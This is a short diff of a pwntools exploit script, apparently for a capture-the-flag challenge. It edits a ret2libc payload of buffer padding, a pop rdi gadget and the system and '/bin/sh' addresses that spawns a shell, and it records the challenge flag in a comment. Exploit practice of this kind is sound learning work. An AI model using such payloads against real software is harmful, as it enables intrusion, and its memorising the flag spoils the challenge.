@@ -2,6 +2,9 @@ import sys
 from pwn import *
 
 # Reference : https://stacklikemind.io/ret2libc-aslr
+#
+# This file is not the solver, instead look at solve2.py
+#
 
 # Flag : Neko{Th4t's_4_n1c3_f33db4ck}
 
@@ -30,7 +33,7 @@ ret = p64(0x040101a)
 pop_rdi_ret = p64(0x0401273)
 main_addr = p64(0x004010b0)
 
-payload1 = b"A"*72 + ret + main_addr #+ pop_rdi_ret + p64(bin_sh_addr) + ret + p64(system_addr)
+payload1 = b"A"*72 + pop_rdi_ret + p64(bin_sh_addr) + ret + p64(system_addr)
 payload2 = b"A"*72 + p64(system_addr) + p64(bin_sh_addr) + p64(exit_addr)
 
 print(prog.recvuntil("\n").decode())
